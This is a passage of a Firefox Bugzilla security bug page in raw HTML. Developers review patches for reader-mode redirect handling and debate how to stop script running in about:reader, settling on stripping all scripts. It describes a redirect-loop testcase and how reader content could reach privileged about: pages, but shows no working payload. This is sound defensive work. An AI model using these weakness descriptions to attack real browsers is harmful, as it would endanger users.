         class="attachment patch obsolete"
         data-id="8643563" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="1182778.txt">
      <meta itemprop="contentSize" content="7338">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8643563">
          <a class="link" href="attachment.cgi?id=8643563&amp;action=diff">
        <span id="att-8643563-description" itemprop="description">Patch for redirect issue with pref for logging</span></a> (obsolete)
        — <a href="attachment.cgi?id=8643563&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1182778&attachment=8643563">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-34" data-comment-id="10579003">This should work, I think?</pre><div class="activity"><div class="change">Assignee: nobody &rarr; gijskruitbosch+bugs</div><div class="change">
        <a href="/attachment.cgi?id=8635260&amp;action=edit"
           title="Patch for redirect issue"
           class=""
        >Attachment #8635260</a> -
        Attachment is obsolete: true</div><div class="change">Status: NEW &rarr; ASSIGNED</div><div class="change">
        <a href="/attachment.cgi?id=8643563&amp;action=edit"
           title="Patch for redirect issue with pref for logging"
           class=""
        >Attachment #8643563</a> -
        Flags: review?(margaret.leibovic)</div><div class="change">
        <a href="/attachment.cgi?id=8643563&amp;action=edit"
           title="Patch for redirect issue with pref for logging"
           class=""
        >Attachment #8643563</a> -
        Flags: feedback+</div></div></div><div class="change-set" id="c35"><div class="comment" data-id="10579024" data-no="35"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-35" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a898404_313730"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a898404_313730"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-35"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-35" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c35">Comment 35</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-05 02:16 PDT" data-time="1438766172">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-35">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-35" data-comment-id="10579024">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8643563" name="attach_8643563" title="Patch for redirect issue with pref for logging">attachment 8643563</a> <a href="/attachment.cgi?id=8643563&amp;action=edit" title="Patch for redirect issue with pref for logging">[details]</a> <a href="/attachment.cgi?id=8643563&amp;action=diff" title="Patch for redirect issue with pref for logging">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8643563'>[review]</a>
Patch for redirect issue with pref for logging

Hrm, nope, not happy with this yet.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8643563&amp;action=edit"
           title="Patch for redirect issue with pref for logging"
           class=""
        >Attachment #8643563</a> -
        Flags: <span class="activity-deleted">review?(margaret.leibovic)</span></div></div></div><div class="change-set" id="c36"><div class="comment" data-id="10579044" data-no="36"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-36" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a898404_313730"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a898404_313730"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-36"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-36" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c36">Comment 36</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-05 02:25 PDT" data-time="1438766733">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-36">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8643570"
         class="attachment patch"
         data-id="8643570" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="1182778.txt">
      <meta itemprop="contentSize" content="7548">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8643570">
          <a class="link" href="attachment.cgi?id=8643570&amp;action=diff">
        <span id="att-8643570-description" itemprop="description">Patch v3</span></a>
        — <a href="attachment.cgi?id=8643570&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1182778&attachment=8643570">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-36" data-comment-id="10579044">Tested on desktop, tried to look for other places that had errors that would expose URIs in reader mode. I think this should be good, but I can't easily test on mobile myself.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8643563&amp;action=edit"
           title="Patch for redirect issue with pref for logging"
           class=""
        >Attachment #8643563</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8643570&amp;action=edit"
           title="Patch v3"
           class=""
        >Attachment #8643570</a> -
        Flags: review?(margaret.leibovic)</div><div class="change">
        <a href="/attachment.cgi?id=8643570&amp;action=edit"
           title="Patch v3"
           class=""
        >Attachment #8643570</a> -
        Flags: feedback+</div></div></div><div class="change-set" id="c37"><div class="comment" data-id="10580214" data-no="37"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-37" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_346894" id="a898404_313730"><img src="https://secure.gravatar.com/avatar/9878b2a2629e131ec58a9760e2733b2f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_346894" id="a898404_313730"><a class="email " href="/user_profile?user_id=346894" > <span class="fna">:Margaret Leibovic</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-37"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-37" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c37">Comment 37</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-05 07:28 PDT" data-time="1438784891">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-37">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-37" data-comment-id="10580214">Comment on <span class=""><a href="/attachment.cgi?id=8643570" name="attach_8643570" title="Patch v3">attachment 8643570</a> <a href="/attachment.cgi?id=8643570&amp;action=edit" title="Patch v3">[details]</a> <a href="/attachment.cgi?id=8643570&amp;action=diff" title="Patch v3">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8643570'>[review]</a>
Patch v3

Review of <span class=""><a href="/attachment.cgi?id=8643570" name="attach_8643570" title="Patch v3">attachment 8643570</a> <a href="/attachment.cgi?id=8643570&amp;action=edit" title="Patch v3">[details]</a> <a href="/attachment.cgi?id=8643570&amp;action=diff" title="Patch v3">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8643570'>[review]</a>:
-----------------------------------------------------------------

This looks reasonable to me. I didn't build and test, but only the ReaderParent changes should need a corresponding mobile update.

::: browser/modules/ReaderParent.jsm
&#64;&#64; +73,5 &#64;&#64;
<span class="quote">&gt;            }
&gt; +        }, e =&gt; {
&gt; +          if (e &amp;&amp; e.newURL) {
&gt; +            message.target.loadURI(&quot;about:reader?url=&quot; + encodeURIComponent(e.newURL));
&gt; +          }</span >

We should probably add the same logic here:
<a rel="nofollow" href="http://mxr.mozilla.org/mozilla-central/source/mobile/android/chrome/content/Reader.js#56">http://mxr.mozilla.org/mozilla-central/source/mobile/android/chrome/content/Reader.js#56</a>

&#64;&#64; +236,5 &#64;&#64;
<span class="quote">&gt;      return yield ReaderMode.downloadAndParseDocument(url).catch(e =&gt; {
&gt; +      if (e &amp;&amp; e.newURL) {
&gt; +        // Pass up the error so we can navigate the browser in question to the new URL:
&gt; +        throw e;
&gt; +      }</span >

And here:
<a rel="nofollow" href="http://mxr.mozilla.org/mozilla-central/source/mobile/android/chrome/content/Reader.js#291">http://mxr.mozilla.org/mozilla-central/source/mobile/android/chrome/content/Reader.js#291</a>

::: toolkit/components/reader/AboutReader.jsm
&#64;&#64; +23,5 &#64;&#64;
<span class="quote">&gt;  let AboutReader = function(mm, win, articlePromise) {
&gt;    let url = this._getOriginalUrl(win);
&gt;    if (!(url.startsWith(&quot;http://&quot;) || url.startsWith(&quot;https://&quot;))) {
&gt; +    let errorMsg = &quot;Only http:// and https:// URLs can be loaded in about:reader.&quot;;
&gt; +    if (Services.prefs.getBoolPref(&quot;reader.errors.includeURLs&quot;))</span >

Thanks for adding this pref.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8643570&amp;action=edit"
           title="Patch v3"
           class=""
        >Attachment #8643570</a> -
        Flags: review?(margaret.leibovic) &rarr; review+</div></div></div><div class="change-set" id="c38"><div class="comment" data-id="10584677" data-no="38"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-38" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a898404_313730"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a898404_313730"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-38"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-38" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c38">Comment 38</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-06 01:16 PDT" data-time="1438848980">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-38">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-38" data-comment-id="10584677">I've not landed this yet because I realized afterwards that redirecting this way might cause an infinite loop:

about:reader?url=<a rel="nofollow" href="http://www.foo.com">http://www.foo.com</a>

foo.com has:

&lt;meta http-equiv=&quot;refresh&quot; content=&quot;URL=<a rel="nofollow" href="http://www.foo.com/">http://www.foo.com/</a>&quot; /&gt; 

and we reload about:reader?url=<a rel="nofollow" href="http://www.foo.com/">http://www.foo.com/</a>

etc.

Of course we can check for equality with the current URI, but that won't help against deliberate loop scenarios.

That wouldn't be any different from the normal meta refresh case if it weren't for the fact that we don't actually fully parse the meta refresh instruction for reader mode, and so it is trivial to make a testcase where opening the page normally does nothing but opening it in reader mode breaks.

Margaret, thoughts?</pre><div class="activity"><div class="change">Flags: needinfo?(margaret.leibovic)</div></div></div><div class="change-set" id="c39"><div class="comment" data-id="10584689" data-no="39"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-39" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a898404_313730"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a898404_313730"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-39"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-39" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c39">Comment 39</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-06 01:17 PDT" data-time="1438849076">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-39">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-39" data-comment-id="10584689">Hm, actually, I suppose that isn't new with this approach, assuming we re-parse the loaded document in the same way... I'll file a separate followup bug for that, then.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(margaret.leibovic)</span></div></div></div><div class="change-set" id="c40"><div class="comment" data-id="10584996" data-no="40"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-40" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a898404_313730"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a898404_313730"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-40"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-40" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c40">Comment 40</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-06 03:05 PDT" data-time="1438855533">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-40">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-40" data-comment-id="10584996">remote:   <a rel="nofollow" href="https://hg.mozilla.org/integration/fx-team/rev/9fc0f0ba0cca">https://hg.mozilla.org/integration/fx-team/rev/9fc0f0ba0cca</a>

Right, so the XSS-side of things. It seems like short-term it's not trivial to completely disable script on the page. We'd need to alter the reader mode page for the buttons to not require script on the page itself, and we'd need to live with not having any video embedding that requires scripts to work on the page. A significant number of news articles these days embed videos as part of a news report (BBC and CNN are significant examples that I can think of off the top of my head that have been reported here) and removing them outright would be a functionality regression that I would not really like to see.

The XSS though happens because a web site is already compromised in some way. That compromise is mitigated outside reader mode by CSP. We could put the content part of reader mode in an iframe and reuse the CSP settings for scripts, maybe? We'd still need to be able to affect styles in the iframe'd content bit, but this would stop the kind of exploit that we're talking about here without breaking object/script content on other pages.

Margaret, does that sound sensible? Do you think there's an easier way to do this?

Dan, Freddy is on PTO, so can you weigh in from the security side of things regarding the XSS / CSP bypass / dealing with scripts/videos in reader mode?</pre><div class="activity"><div class="change">Flags: needinfo?(margaret.leibovic)</div><div class="change">Flags: needinfo?(dveditz)</div><div class="change">Keywords: <a href="/buglist.cgi?keywords=leave-open&amp;resolution=---">leave-open</a></div></div></div><div class="change-set" id="c41"><div class="comment" data-id="10589185" data-no="41"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-41" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_308534" id="a898404_313730"><img src="https://secure.gravatar.com/avatar/bb55b2a8c34fd29f570ca139f13d46b8?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_308534" id="a898404_313730"><a class="email " href="/user_profile?user_id=308534" > <span class="fna">Wes Kocher (:KWierso) (Not reading bugmail; email directly if needed)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-41"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-41" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c41">Comment 41</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-06 17:28 PDT" data-time="1438907338">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-41">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-41" data-comment-id="10589185"><a rel="nofollow" href="https://hg.mozilla.org/mozilla-central/rev/9fc0f0ba0cca">https://hg.mozilla.org/mozilla-central/rev/9fc0f0ba0cca</a></pre></div><div class="change-set" id="a2898593_1689"><div class="change" id="aa2898593_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a2898593_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a2898593_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a2898593_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a2898593_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a2898593_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-13 19:57 PDT" data-time="1439521067">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: needinfo?(dveditz) &rarr; sec-bounty?</div></div></div><div class="change-set" id="a2906880_1689"><div class="change" id="aa2906880_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a2906880_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a2906880_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a2906880_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a2906880_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a2906880_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-13 22:15 PDT" data-time="1439529354">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8632450&amp;action=edit"
           title="A page to load in Reader View. it contains an SVG that executes script but doesn't get stripped."
           class=""
        >Attachment #8632450</a> -
        Attachment mime type: text/plain &rarr; text/html</div></div></div><div class="change-set" id="c42"><div class="comment" data-id="10618016" data-no="42"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-42" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a2906880_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a2906880_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-42"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-42" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c42">Comment 42</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-14 00:34 PDT" data-time="1439537684">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-42">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-42" data-comment-id="10618016">You've got a hairy set of competing goals here :-(  To be honest I'm uncomfortable taking scripts (even legit scripts on the page) and transplanting them to a new origin. I guess the about: urls are all separate origins so there's that at least. I'd be happiest with us scraping static content and putting into an &lt;iframe sandbox&gt;, which was designed to hold untrusted content.

When you put the content into an about:something URL it gets different powers than we've thought through. For instance it can link to or frame &quot;about:config&quot;, a chrome-privileged window. We've had several vulnerabilities in the past that were mitigated by the inability of web content to link to or otherwise manipulate a chrome-privileged window. It's not same-origin and it /should/ be safe, but we've had many vulnerabilities that this kind of set up turned from a same-origin violation into arbitrary code execution. That argues for sanitizing the content within an inch of its life.

What's the alternative? Trying to copy over the CSP (converting 'self' to the original origin, modifying directives like style-src that get in your way) would protect against this case where the script wasn't supposed to be there, that it's an attack from some 3rd party on the page. It would not, however, protect against a malicious page trying to use about:reader to crack Firefox open -- such a page would simply avoid having a CSP.

Could we create an overlay &lt;div&gt; that covers the original page content? Then we're not messing with the origin and any page CSP easily applies. But then it's pretty easy for the page to mess with the reader overlay if it wanted.

What if we display the page in about:reader but apply a CSP that blocks most scripts, but whitelists our own video playback controls that was apply to any &lt;video&gt; tags we find. Or we present a placeholder image for any videos, but when you click it you go somewhere else to watch it (maybe back to the original page?).

Really don't know what's safe to do.</pre></div><div class="change-set" id="c43"><div class="comment" data-id="10624636" data-no="43"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-43" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a2906880_1689"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a2906880_1689"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-43"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-43" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c43">Comment 43</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-17 04:19 PDT" data-time="1439810396">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-43">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-43" data-comment-id="10624636">(In reply to Daniel Veditz [:dveditz] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c42">comment #42</a>)
<span class="quote">&gt; You've got a hairy set of competing goals here :-(  To be honest I'm
&gt; uncomfortable taking scripts (even legit scripts on the page) and
&gt; transplanting them to a new origin. I guess the about: urls are all separate
&gt; origins so there's that at least. I'd be happiest with us scraping static
&gt; content and putting into an &lt;iframe sandbox&gt;, which was designed to hold
&gt; untrusted content.</span >

Right. Security-wise, I'm unhappy at the current state of things, too (even if this is &quot;only&quot; sec-moderate).

AIUI, the major video sites currently don't let you use &lt;video&gt; to embed content, and a quick test shows that embedding in a sandboxed iframe without allow-scripts breaks embed/object.

So it seems we have a choice between:

1) do nothing (technically an option, not the one I'd prefer...)
2) try to apply site CSP. Would fix this issue, would potentially leave other holes (esp. as we're reconsidering the restriction on file:/// URIs);
3) apply strict sandboxing and break essentially all the videos.

I am not a great web video user, so I would happily pick (3) (maybe with the click-through that dveditz is suggesting) but I can see how that would result in news articles missing their embedded content and such. :-\

Margaret, how do you feel about the web video breakage + clickthrough for those?</pre></div><div class="change-set" id="c44"><div class="comment" data-id="10655810" data-no="44"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-44" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a2906880_1689"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a2906880_1689"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-44"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-44" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c44">Comment 44</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-25 08:11 PDT" data-time="1440515507">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-44">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-44" data-comment-id="10655810">Per discussion with Margaret, we think we should just strip everything. This is what other browsers (Safari) do, it is the safer option, and the primary usecase for reader mode is not watching video.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(margaret.leibovic)</span></div></div></div><div class="change-set" id="a3893213_159069"><div class="change" id="aa3893213_159069">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a3893213_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a3893213_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a3893213_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3893213_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a3893213_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-25 08:14 PDT" data-time="1440515687">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: needinfo?(fbraun)</div><div class="change">Flags: needinfo?(dveditz)</div></div></div><div class="change-set" id="a4555756_546015"><div class="change" id="aa4555756_546015">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_546015" id="a4555756_546015"><img src="https://secure.gravatar.com/avatar/d0465b8931b44330f542efbeeae855da?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_546015" id="a4555756_546015"><a class="email " href="/user_profile?user_id=546015" > <span class="fna">BMO Automation</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a4555756_546015"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a4555756_546015">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a4555756_546015">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-02 00:17 PDT" data-time="1441178230">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
